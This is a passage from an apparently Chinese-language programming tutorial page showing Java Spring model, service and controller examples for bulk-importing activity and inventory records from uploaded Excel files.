<span class="token keyword">private</span> Date activityEndTime<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"信易行活动描述"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"活动描述"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String activityDescribe<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"活动状态(0:启用，1:禁用)"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"活动状态(0:启用，1:禁用)"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String activityState<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="Service类-1"><a href="#Service类-1" class="headerlink" title="Service类"></a>Service类</h3><pre class=" language-java"><code class="language-java"> <span class="token comment" spellcheck="true">/**     * 批量导入     *     * @param is:     * @param userId:     * @param username:     * @return     */</span>    <span class="token keyword">public</span> Boolean <span class="token function">importExcel</span><span class="token punctuation">(</span>InputStream is<span class="token punctuation">,</span> Integer userId<span class="token punctuation">,</span> String username<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ExcelUtil<span class="token operator">&lt;</span>ImportActivityReq<span class="token operator">></span> excelUtil <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExcelUtil</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>ImportActivityReq<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            List<span class="token operator">&lt;</span>ImportActivityReq<span class="token operator">></span> xingActivitys <span class="token operator">=</span> excelUtil<span class="token punctuation">.</span><span class="token function">importExcel</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>xingActivitys <span class="token operator">==</span> null <span class="token operator">||</span> xingActivitys<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServiceException</span><span class="token punctuation">(</span><span class="token string">"excel文件内容为空"</span><span class="token punctuation">,</span> <span class="token number">206</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            xingActivitys<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>x <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                XINGActivity xingActivity <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XINGActivity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setXingActivityName</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">getActivityName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setXingActivityHost</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">getActivityHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setXingActivityState</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">getActivityState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setXingActivityStartTime</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">getActivityStartTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setXingActivityEndTime</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">getActivityEndTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setXingActivityDescribe</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">getActivityDescribe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setDelFlag</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setCreateTime</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setCreateUserId</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setCreateUserName</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivityMapper<span class="token punctuation">.</span><span class="token function">insertSelective</span><span class="token punctuation">(</span>xingActivity<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServiceException</span><span class="token punctuation">(</span><span class="token string">"文件导入失败或者excel文件内容不能为空"</span><span class="token punctuation">,</span> <span class="token number">206</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h3><pre class=" language-java"><code class="language-java"> <span class="token comment" spellcheck="true">/**     *  批量导入     * @param file:      * @return      */</span>    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"导入活动信息"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"importExcel"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> ResultData<span class="token operator">&lt;</span>Boolean<span class="token operator">></span> <span class="token function">importExcel</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestPart</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span>MultipartFile file<span class="token punctuation">)</span><span class="token punctuation">{</span>        InputStream inputStream<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            inputStream <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServiceException</span><span class="token punctuation">(</span><span class="token string">"上传文件异常！"</span><span class="token punctuation">,</span> HttpStatus<span class="token punctuation">.</span>NO_CONTENT<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Boolean aBoolean <span class="token operator">=</span> xingActivityService<span class="token punctuation">.</span><span class="token function">importExcel</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">,</span><span class="token function">getUserId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResultData<span class="token operator">&lt;</span>Boolean<span class="token operator">></span> resultData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultData</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resultData<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span>aBoolean<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> resultData<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h2 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h2><h3 id="Model类-2"><a href="#Model类-2" class="headerlink" title="Model类"></a>Model类</h3><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@ApiModel</span><span class="token punctuation">(</span><span class="token string">"活动导入模板类"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Data</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ImportActivityReq</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span>3253903642039788589L<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"XING_Activity_name"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"信易行活动名称"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"活动名称"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String activityName<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 信易行活动举办单位     *     * Table:     XYGL_XING_Activity     * Column:    XING_Activity_host     * Nullable:  true     */</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"XING_Activity_host"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"信易行活动举办单位"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"活动举办单位"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String activityHost<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 信易行活动开始时间     *     * Table:     XYGL_XING_Activity     * Column:    XING_Activity_start_time     * Nullable:  true     */</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"XING_Activity_start_time"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"信易行活动开始时间"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"活动开始时间"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@JsonFormat</span><span class="token punctuation">(</span>pattern <span class="token operator">=</span> <span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">,</span>timezone <span class="token operator">=</span> <span class="token string">"GMT+8"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> Date activityStartTime<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 信易行活动结束时间     *     * Table:     XYGL_XING_Activity     * Column:    XING_Activity_end_time     * Nullable:  true     */</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"XING_Activity_end_time"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"信易行活动结束时间"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"活动结束时间"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@JsonFormat</span><span class="token punctuation">(</span>pattern <span class="token operator">=</span> <span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">,</span>timezone <span class="token operator">=</span> <span class="token string">"GMT+8"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> Date activityEndTime<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 信易行活动描述     *     * Table:     XYGL_XING_Activity     * Column:    XING_Activity_describe     * Nullable:  true     */</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"XING_Activity_describe"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"信易行活动描述"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"活动描述"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String activityDescribe<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 信易行活动状态(0:启用，1:禁用)     *     * Table:     XYGL_XING_Activity     * Column:    XING_Activity_state     * Nullable:  true     */</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"XING_Activity_state"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"活动状态(0:启用，1:禁用)"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"活动状态(0:启用，1:禁用)"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String activityState<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="Service类-2"><a href="#Service类-2" class="headerlink" title="Service类"></a>Service类</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> String <span class="token function">importActivity</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>ImportActivityReq<span class="token operator">></span> activityList<span class="token punctuation">,</span> Integer userId<span class="token punctuation">,</span> String username<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNull</span><span class="token punctuation">(</span>activityList<span class="token punctuation">)</span> <span class="token operator">||</span> activityList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServiceException</span><span class="token punctuation">(</span><span class="token string">"导入活动信息不能为空！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> successNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> failureNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        StringBuilder successMsg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        StringBuilder failureMsg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>ImportActivityReq activity <span class="token operator">:</span> activityList<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                XINGActivity xingActivity <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XINGActivity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setXingActivityName</span><span class="token punctuation">(</span>activity<span class="token punctuation">.</span><span class="token function">getActivityName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setXingActivityHost</span><span class="token punctuation">(</span>activity<span class="token punctuation">.</span><span class="token function">getActivityHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setXingActivityState</span><span class="token punctuation">(</span>activity<span class="token punctuation">.</span><span class="token function">getActivityState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setXingActivityStartTime</span><span class="token punctuation">(</span>activity<span class="token punctuation">.</span><span class="token function">getActivityStartTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setXingActivityEndTime</span><span class="token punctuation">(</span>activity<span class="token punctuation">.</span><span class="token function">getActivityEndTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setXingActivityDescribe</span><span class="token punctuation">(</span>activity<span class="token punctuation">.</span><span class="token function">getActivityDescribe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setDelFlag</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setCreateTime</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setCreateUserId</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivity<span class="token punctuation">.</span><span class="token function">setCreateUserName</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>                xingActivityMapper<span class="token punctuation">.</span><span class="token function">insertSelective</span><span class="token punctuation">(</span>xingActivity<span class="token punctuation">)</span><span class="token punctuation">;</span>                successNum<span class="token operator">++</span><span class="token punctuation">;</span>                successMsg<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;br/>"</span> <span class="token operator">+</span> successNum <span class="token operator">+</span> <span class="token string">"、活动信息 "</span> <span class="token operator">+</span> activity<span class="token punctuation">.</span><span class="token function">getActivityName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 导入成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                failureNum<span class="token operator">++</span><span class="token punctuation">;</span>                String msg <span class="token operator">=</span> <span class="token string">"&lt;br/>"</span> <span class="token operator">+</span> failureNum <span class="token operator">+</span> <span class="token string">"、活动信息 "</span> <span class="token operator">+</span> activity<span class="token punctuation">.</span><span class="token function">getActivityName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 导入失败："</span><span class="token punctuation">;</span>                failureMsg<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>msg <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>failureNum <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            failureMsg<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"很抱歉，导入失败！共 "</span> <span class="token operator">+</span> failureNum <span class="token operator">+</span> <span class="token string">" 条数据格式不正确，错误如下："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServiceException</span><span class="token punctuation">(</span>failureMsg<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            successMsg<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"恭喜您，数据已全部导入成功！共 "</span> <span class="token operator">+</span> successNum <span class="token operator">+</span> <span class="token string">" 条，数据如下："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> successMsg<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="Controller类-1"><a href="#Controller类-1" class="headerlink" title="Controller类"></a>Controller类</h3><pre class=" language-java"><code class="language-java">    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"导入活动信息"</span><span class="token punctuation">,</span>notes <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/importExcel"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> ResultData <span class="token function">importActivity</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestPart</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span> MultipartFile file<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        ExcelUtil<span class="token operator">&lt;</span>ImportActivityReq<span class="token operator">></span> util <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExcelUtil</span><span class="token operator">&lt;</span>ImportActivityReq<span class="token operator">></span><span class="token punctuation">(</span>ImportActivityReq<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>ImportActivityReq<span class="token operator">></span> activityList <span class="token operator">=</span> util<span class="token punctuation">.</span><span class="token function">importExcel</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String message <span class="token operator">=</span> xingActivityService<span class="token punctuation">.</span><span class="token function">importActivity</span><span class="token punctuation">(</span>activityList<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token function">toIntExact</span><span class="token punctuation">(</span><span class="token function">getUserId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResultData resultData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultData</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resultData<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> resultData<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h2 id="例4（包含字段校验）"><a href="#例4（包含字段校验）" class="headerlink" title="例4（包含字段校验）"></a>例4（包含字段校验）</h2><h3 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h3><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Data</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PlatformInventoryExcel</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@ExcelColumn</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"清单名称"</span><span class="token punctuation">,</span> col <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"清单名称"</span><span class="token punctuation">,</span> sort <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"清单名称"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String inventoryName<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ExcelColumn</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"服务事项"</span><span class="token punctuation">,</span> col <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"服务事项"</span><span class="token punctuation">,</span> sort <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"service_matter"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"服务事项"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String serviceMatter<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ExcelColumn</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"配套政策"</span><span class="token punctuation">,</span> col <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"配套政策"</span><span class="token punctuation">,</span> sort <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"配套政策"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String policy<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ExcelColumn</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"对接科室"</span><span class="token punctuation">,</span> col <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"对接科室"</span><span class="token punctuation">,</span> sort <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"对接科室"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String dockingStation<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ExcelColumn</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"联系人姓名"</span><span class="token punctuation">,</span> col <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"联系人姓名"</span><span class="token punctuation">,</span> sort <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"联系人姓名"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String contactsPersonName<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ExcelColumn</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"联系人手机号"</span><span class="token punctuation">,</span> col <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"联系人手机号"</span><span class="token punctuation">,</span> sort <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"联系人手机号"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String contactsPersonPhone<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ExcelColumn</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"建设详细地址"</span><span class="token punctuation">,</span> col <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"建设详细地址"</span><span class="token punctuation">,</span> sort <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value <span class="token 